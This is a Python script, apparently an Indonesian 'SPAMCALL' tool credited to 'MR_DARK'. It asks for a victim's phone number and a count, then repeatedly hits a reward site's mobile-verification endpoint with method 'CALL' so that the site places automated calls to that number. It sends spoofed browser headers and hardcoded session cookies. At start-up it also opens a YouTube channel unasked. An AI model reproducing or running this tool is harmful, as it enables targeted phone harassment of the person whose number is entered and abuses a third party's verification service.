import os,sys,time
import requests
import subprocess
from requests import post
os.system('xdg-open https://youtube.com/channel/UCnti7B0HaFE0izlHKwZMn8A')
#TOLOL
#LU MAU DECODE?
#SUBREK DULU
SUBREK = "https://id.jagreward.com/member/verify-mobile/"























































































































def bersih():
    os.system("clear")

def balik():
    d = input("\033[1;97mlagi? (y/t): ")
    if d == "y":
       subprocess.call("python dark_call.py",shell=True)
    elif d == "t":
         print ("\033[1;91mDAH LAH JAN LUPA SUBREK CHANNEL MR_DARK LOOOO")
         os.system("exit")
bersih()
subprocess.call("figlet SPAMCALL |lolcat",shell=True)
r = """
\033[1;97m
    /\_/\           ___
   = o_o =_______    \ \  -Subscribe MR_DARK-
    __^      __(  \.__) )
(@)<_____>__(_____)____/
==================================================
Youtube \033[1;91m:\033[1;96mMR_DARK\033[1;97m
Github  \033[1;91m:\033[1;92mhttps://github.com/DARK-02\033[1;97m
contoh nomor yang salah \033[1;91m:\033[1;96m08729xxxxxxx\033[1;97m
contoh nomor yang benar \033[1;91m:\033[1;96m8729xxxxx\033[1;97m
==================================================
"""
print (r)
kesalahan = input("\033[1;97m[\033[1;96mnomor yang akan lu siksa\033[1;97m]:\033[1;93m ")
w = int(input("\033[1;97m[\033[1;96mmasukan jumlah spam\033[1;97m]:\033[1;93m"))
time.sleep(2)
print ("\033[1;92mLoading\033[1;97m...")
time.sleep(2)
gagal = {
"X-Requested-With": "XMLHttpRequest",
"User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
"Content-Type":" application/x-www-form-urlencoded; charset=UTF-8",
"Content-Type": "application/json",
"Origin": "https://id.jagreward.com",
"Referer": "https://id.jagreward.com/member/register/",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
"__cfduid": "d4de1e7ea2ced09ecde54a568af1ac50b1584709816",
"_ga": "GA1.2.2037151396.1584709855",
"PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc",
"DAPROPS": "sjs.webGlRenderer:PowerVR Rogue GE8320|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.75|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:1|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0",
}
textjavascript = {
"method": "CALL",
"countryCode": "id",
}
def kirim():
    try:
        for i in range(w):
            r = requests.get(SUBREK+kesalahan,data=textjavascript, headers=gagal)
            print ("\033[1;97m[\033[1;96mResult\033[1;97m:\033[1;93m", r.json()["result"],"\033[1;97m[\033[1;96mStatus\033[1;97m]:\033[1;93m", r.json()["message"])
            time.sleep(3)
    except KeyboardInterrupt:
            print ("\033[1;91mStop!!")
kirim()
balik()
